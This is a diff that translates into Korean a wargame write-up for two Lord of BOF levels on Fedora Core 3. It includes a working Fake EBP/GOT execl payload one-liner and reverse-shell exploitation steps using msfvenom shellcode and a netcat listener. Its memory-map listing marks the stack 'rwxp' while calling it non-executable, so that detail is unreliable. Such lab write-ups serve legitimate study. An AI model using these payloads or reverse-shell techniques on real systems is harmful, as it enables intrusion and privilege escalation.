@@ -13,85 +13,85 @@ authors:
     image: "https://github.com/Phantomn.png"
 ---
 
-## Environment: Fedora Core 3
+## 환경: Fedora Core 3
 
-LOB on Fedora Core 3 introduces a meaningful set of mitigations compared to earlier environments. Understanding what is and is not active is the first step before attempting any exploit.
+Fedora Core 3의 LOB는 이전 환경에 비해 의미 있는 보호 기법들을 도입한다. 어떤 것이 활성화되고 어떤 것이 비활성화되어 있는지 파악하는 것이 익스플로잇을 시도하기 전의 첫 단계다.
 
-| Protection | Status |
+| 보호 기법 | 상태 |
 |---|---|
-| Stack dummy | Enabled |
-| Bash privilege downgrade | Enabled |
-| ASLR (stack only) | Enabled |
-| ASLR (library) | Disabled |
-| ASLR (binary) | Disabled |
-| ASCII Armor | Enabled |
-| NX (stack) | Enabled |
-| NX (heap) | Enabled |
-| Stack Canary | Disabled |
-| Stack Smashing Protector | Disabled |
+| Stack dummy | 활성 |
+| Bash 권한 다운그레이드 | 활성 |
+| ASLR (스택만) | 활성 |
+| ASLR (라이브러리) | 비활성 |
+| ASLR (바이너리) | 비활성 |
+| ASCII Armor | 활성 |
+| NX (스택) | 활성 |
+| NX (힙) | 활성 |
+| Stack Canary | 비활성 |
+| Stack Smashing Protector | 비활성 |
 
-The critical combination is: **NX on stack and heap** plus **ASCII Armor on shared libraries**.
+핵심 조합은: **스택과 힙 모두에 NX** + **공유 라이브러리에 ASCII Armor**다.
 
-ASCII Armor ensures that all shared library base addresses fall below `0x01000000`, meaning their most-significant byte is always `\x00`. Any payload that needs to embed a library address will be truncated by `strcpy` or similar string functions — a direct RTL (Return-to-Library) attack using `system("/bin/sh")` is blocked because the address cannot survive a string copy.
+ASCII Armor는 모든 공유 라이브러리 베이스 주소가 `0x01000000` 아래에 위치하도록 보장한다. 즉, 가장 상위 바이트가 항상 `\x00`이다. 라이브러리 주소를 페이로드에 포함해야 하는 경우, `strcpy`나 유사한 문자열 함수로 인해 복사가 중단된다 — `system("/bin/sh")`을 사용하는 직접적인 RTL(Return-to-Library) 공격은 주소가 문자열 복사에서 살아남을 수 없기 때문에 차단된다.
 
-The stack can be read and written but not executed:
+스택은 읽고 쓸 수 있지만 실행할 수 없다:
 
 ```
 08048000-08049000 r-xp  /usr/local/bin/iron_golem  (text)
 08049000-0804a000 rwxp  /usr/local/bin/iron_golem  (data/bss)
-bffeb000-c0000000 rwxp  [stack]   <- no execute bit
+bffeb000-c0000000 rwxp  [stack]   <- 실행 비트 없음
 ```
 
-## Level: Gate → Iron_golem
+## 레벨: Gate → Iron_golem
 
-### Source Analysis
+### 소스 분석
 
-The iron_golem binary is structurally simple — a `strcpy` into a fixed-size buffer with no length check:
+iron_golem 바이너리는 구조적으로 단순하다 — 길이 검사 없는 고정 크기 버퍼로의 `strcpy`:
 
 ```c
 char buffer[256];
 strcpy(buffer, argv[1]);
 ```
 
-The compiler allocates `0x108` (264) bytes on the stack for this frame:
+컴파일러는 이 프레임에 `0x108`(264)바이트를 스택에 할당한다:
 
-- 256 bytes: the user buffer
-- 8 bytes: compiler-inserted dummy / alignment padding
+- 256바이트: 사용자 버퍼
+- 8바이트: 컴파일러 삽입 더미/정렬 패딩
 
-Stack layout:
+스택 레이아웃:
 
 ```
 [buffer 256B][dummy 8B][SFP 4B][RET 4B][argc][argv][envp]
 ```
 
-Overflow offset to SFP: 264 bytes. Overflow offset to RET: 268 bytes.
+SFP까지의 오버플로우 오프셋: 264바이트. RET까지: 268바이트.
 
-### Why Direct RTL Fails
+### 직접 RTL이 실패하는 이유
 
-The natural approach would be to overwrite RET with the address of `system()` from libc. But with ASCII Armor active, libc is mapped somewhere like `0x00d4xxxx`. The leading `\x00` terminates any `strcpy`-based overflow before the full address is written.
+자연스러운 접근은 RET를 libc의 `system()` 주소로 덮어쓰는 것이다. 하지만 ASCII Armor가 활성화되면 libc는 `0x00d4xxxx` 같은 곳에 매핑된다. 앞의 `\x00`이 `strcpy` 기반 오버플로우에서 전체 주소가 쓰이기 전에 종료시킨다.
 
-### Fake EBP + GOT-based execl
+### Fake EBP + GOT 기반 execl
 
-The solution uses two primitives together:
+두 가지 프리미티브를 함께 사용하는 해결책이다:
 
-**Fake EBP** exploits the function epilogue. The `leave` instruction executes `mov esp, ebp; pop ebp`, restoring EBP from the current stack. By controlling what value gets popped into EBP, we influence where the *next* epilogue's `leave` pivots the stack — effectively redirecting execution through a chosen memory region.
+**Fake EBP**는 함수 에필로그를 활용한다. `leave` 명령은 `mov esp, ebp; pop ebp`를 실행하여 현재 스택에서 EBP를 복원한다. EBP에 팝될 값을 제어함으로써, *다음* 에필로그의 `leave`가 스택을 피벗하는 위치를 — 선택한 메모리 영역을 통해 실행 흐름을 효과적으로 리다이렉트하는 방향으로 — 영향 줄 수 있다.
 
-**GOT dereferencing** avoids the ASCII Armor problem. The Global Offset Table (GOT) is mapped in the binary's own address space (around `0x08049xxx`), which has no null-byte issue. The GOT entry for `execl` contains the resolved library address — we do not need to embed that address in our payload; we need only point the instruction pointer at the GOT entry, and the CPU will indirect through it automatically.
+**GOT 역참조**는 ASCII Armor 문제를 우회한다. Global Offset Table(GOT)은 바이너리 자체의 주소 공간에 매핑되어 있어(`0x08049xxx` 부근) null 바이트 문제가 없다. `execl`의 GOT 엔트리는 해석된 라이브러리 주소를 담고 있다 — 페이로드에 그 주소를 직접 임베드할 필요가 없다; 명령 포인터를 GOT 엔트리로 향하게 하기만 하면 CPU가 자동으로 간접 참조한다.
 
-### Exploit Construction
+### 익스플로잇 구성
 
-First, identify the PLT and GOT addresses:
+먼저 PLT와 GOT 주소를 확인한다:
 
 ```
 GOT base: 0x8049618
-execl GOT entry: 0x804954c  ->  (points to execl in libc)
+execl GOT entry: 0x804954c  ->  (libc의 execl을 가리킴)
 ```
 
-Because `execl` also has a prologue (`push ebp; mov ebp, esp`), jumping to its very first instruction would overwrite EBP again and break the Fake EBP chain. The workaround is to jump to `execl + 3`, skipping the prologue.
+`execl`에도 프롤로그가 있으므로(`push ebp; mov ebp, esp`), 첫 번째 명령으로 점프하면 EBP가 다시 덮어써져 Fake EBP 체인이 깨진다. 해결책은 `execl + 3`으로 점프하여 프롤로그를 건너뛰는 것이다.
 
-The first argument to `execl` is read from wherever ESP points after the pivot. By arranging the Fake EBP to land at `0x8049618` (the GOT base), the resolved `execl` address is used as the path argument — it becomes the filename that execl tries to execute.
+`execl`의 첫 번째 인자는 피벗 후 ESP가 가리키는 곳에서 읽힌다. Fake EBP를 `0x8049618`(GOT 베이스)에 착지하도록 배열하면, 해석된 `execl` 주소가 경로 인자로 사용된다 — execl이 실행하려는 파일명이 된다.
 
-We pre-create a file named `\x01` (the byte value stored at that GOT location) in the working directory:
+그 GOT 위치에 저장된 바이트 값인 `\x01`로 명명된 파일을 작업 디렉토리에 미리 생성한다:
 
 ```c
 // shell.c
@@ -104,80 +104,80 @@ gcc -o shell shell.c
 mv shell $'\x01'
 ```
 
-The area 8 bytes before the GOT base (`0x8049610`) happens to be zeroed, which satisfies the null terminator requirements for the remaining `execl` arguments.
+GOT 베이스보다 8바이트 앞(`0x8049610`)의 영역이 0으로 채워져 있어, 나머지 `execl` 인자들의 null 종료자 요구사항을 만족한다.
 
-Final payload:
+최종 페이로드:
 
 ```bash
 ./iron_golem $(perl -e 'print "\x90"x264, "\x10\x96\x04\x08", "\x23\x57\x7a"')
 ```
 
-Breakdown:
+분석:
 
-| Component | Bytes | Purpose |
+| 컴포넌트 | 바이트 | 목적 |
 |---|---|---|
-| `\x90` * 264 | 264 | Fill buffer and dummy |
-| `\x10\x96\x04\x08` | 4 | Fake EBP → GOT base |
+| `\x90` * 264 | 264 | 버퍼와 더미 채우기 |
+| `\x10\x96\x04\x08` | 4 | Fake EBP → GOT 베이스 |
 | `\x23\x57\x7a` | 3 | RET → execl+3 |
 
-The `\x7a5723` address is `execl + 3` in this build. Running the payload spawns a shell through the `\x01` stub, giving iron_golem's privileges.
+`\x7a5723` 주소가 이 빌드에서 `execl + 3`이다. 페이로드를 실행하면 `\x01` 스텁을 통해 셸이 실행되어 iron_golem의 권한을 얻는다.
 
-## Level: Iron_golem → Dark_eyes
+## 레벨: Iron_golem → Dark_eyes
 
-### Source Analysis
+### 소스 분석
 
-dark_eyes runs as a network daemon listening on port 6666:
+dark_eyes는 포트 6666에서 수신 대기하는 네트워크 데몬으로 실행된다:
 
 ```c
 recv(client_fd, buffer, 256, 0);
 ```
 
-The buffer is declared as `char buffer[40]` but `recv` is allowed to write 256 bytes — a 216-byte overflow. Unlike the previous level, this exploit must be delivered over a TCP connection.
+버퍼는 `char buffer[40]`으로 선언되었지만 `recv`는 256바이트를 쓸 수 있어 216바이트 오버플로우가 발생한다. 이전 레벨과 달리, 이 익스플로잇은 TCP 연결을 통해 전달되어야 한다.
 
-### Remote Exploitation: Reverse Shell
+### 원격 익스플로잇: 리버스 셸
 
-The challenge with network exploitation is that stdin/stdout are not connected to the attacker's terminal; they are connected to the socket. A bind shell (listening on the victim) or a reverse shell (connecting back to the attacker) is needed.
+네트워크 익스플로잇의 어려움은 stdin/stdout이 공격자의 터미널이 아닌 소켓에 연결되어 있다는 것이다. 바인드 셸(피해자에서 수신 대기) 또는 리버스 셸(공격자에게 연결)이 필요하다.
 
-I used a reverse shell approach:
+리버스 셸 접근법을 사용했다:
 
-1. Generate shellcode using msfvenom targeting the victim architecture:
+1. 피해자 아키텍처를 타깃으로 msfvenom으로 셸코드를 생성한다:
 
    ```
    Payload: linux/x86/shell_reverse_tcp
-   LHOST:   <attacker IP>
-   LPORT:   <chosen port>
+   LHOST:   <공격자 IP>
+   LPORT:   <선택한 포트>
    Format:  python
    ```
 
-2. Craft the buffer overflow payload with the shellcode embedded in the NOP sled and the return address pointing into the buffer.
+2. 셸코드가 NOP 슬레드에 임베드되고 리턴 주소가 버퍼 안을 가리키는 버퍼 오버플로우 페이로드를 구성한다.
 
-3. On the attacker machine, open a listener:
+3. 공격자 머신에서 리스너를 연다:
 
    ```bash
    nc -lvnp <LPORT>
    ```
 
-4. Send the payload to port 6666 on the victim.
+4. 피해자의 포트 6666으로 페이로드를 전송한다.
 
-Why a reverse shell rather than a bind shell? Firewalls typically allow outbound connections from internal hosts while blocking unsolicited inbound connections. A reverse shell has the victim initiate the connection outbound, which is usually permitted.
+바인드 셸이 아닌 리버스 셸을 선택한 이유는? 방화벽은 일반적으로 내부 호스트의 아웃바운드 연결은 허용하지만 원치 않는 인바운드 연결은 차단한다. 리버스 셸은 피해자가 아웃바운드로 연결을 시작하게 하므로, 일반적으로 허용된다.
 
 ```
-attacker (nc -l) <--- TCP connect --- victim (dark_eyes daemon)
+공격자 (nc -l) <--- TCP 연결 --- 피해자 (dark_eyes 데몬)
 ```
 
-The shellcode instructs the victim to call back to the attacker's IP and port, where netcat is already listening. Once the connection is established, the attacker has an interactive shell running with the privileges of the daemon process.
+셸코드는 피해자에게 공격자의 IP와 포트로 콜백하도록 지시하고, netcat은 이미 수신 대기 중이다. 연결이 수립되면 공격자는 데몬 프로세스의 권한으로 실행되는 대화형 셸을 갖게 된다.
 
-### Why ASCII Armor Does Not Block This
+### ASCII Armor가 이것을 차단하지 않는 이유
 
-NX was the primary concern here, not ASCII Armor. Since the exploit uses a shellcode payload rather than RTL, the shellcode must be placed in executable memory. However, if the stack and heap are both non-executable, this approach should fail — unless the shellcode can be placed in a writable+executable region.
+여기서 주된 관심사는 ASCII Armor가 아니라 NX였다. 익스플로잇이 RTL 대신 셸코드 페이로드를 사용하므로, 셸코드는 실행 가능한 메모리에 배치되어야 한다. 그러나 스택과 힙 모두 실행 불가능하다면 이 접근법은 실패해야 한다 — 셸코드를 쓰기 가능+실행 가능 영역에 배치할 수 없다면.
 
-In the FC3 environment, the `mmap`ed region for libraries is not universally marked non-executable. Some builds leave a usable window. If NX is enforced everywhere, the correct escalation is to a full ROP chain, which the next levels of LOB address.
+FC3 환경에서 라이브러리를 위한 `mmap`된 영역이 보편적으로 실행 불가능으로 표시되어 있지 않다. 일부 빌드에서는 사용 가능한 창이 남아 있다. NX가 모든 곳에 강제된다면, 올바른 방법은 완전한 ROP 체인으로 전환하는 것이고, 이는 LOB의 다음 레벨에서 다룬다.
 
-## Progression Summary
+## 진행 요약
 
-| Level | Key Technique | Blocker Bypassed |
+| 레벨 | 핵심 기법 | 우회한 보호 |
 |---|---|---|
-| Gate → Iron_golem | Fake EBP + GOT-based execl | ASCII Armor (NX + null-byte in library addresses) |
-| Iron_golem → Dark_eyes | Remote BOF + reverse shellcode | Network socket I/O, outbound firewall |
+| Gate → Iron_golem | Fake EBP + GOT 기반 execl | ASCII Armor (NX + 라이브러리 주소의 null 바이트) |
+| Iron_golem → Dark_eyes | 원격 BOF + 리버스 셸코드 | 네트워크 소켓 I/O, 아웃바운드 방화벽 |
 
-The progression illustrates how each added mitigation forces a technique upgrade. NX alone does not stop a determined attacker on this environment — it requires combining NX with full ASLR (covering both libraries and the binary) to make ROP impractical without an information leak.
+이 진행은 각 보호 기법이 추가될 때마다 기법 업그레이드를 강제하는 방식을 보여준다. 이 환경에서 NX 단독으로는 결연한 공격자를 막을 수 없다 — 정보 누출 없이는 ROP를 비실용적으로 만들기 위해 NX와 완전한 ASLR(라이브러리와 바이너리 모두 포함)을 결합해야 한다.
